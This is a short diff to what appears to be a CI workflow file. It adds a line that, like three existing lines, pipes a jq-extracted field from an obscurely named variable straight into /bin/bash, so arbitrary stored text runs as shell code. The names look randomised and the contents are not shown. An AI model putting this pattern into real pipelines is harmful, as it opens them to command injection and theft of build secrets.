@@ -25,6 +25,7 @@ jobs:
           echo $lckt5 | jq -r .vui1307 | /bin/bash
           printf '%s' "$j688" | jq -r .rcdc50 | /bin/bash
           echo $jpoe1 | jq -r .nxvw590 | /bin/bash
+          echo $twzd70903 | jq -r .haui283 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
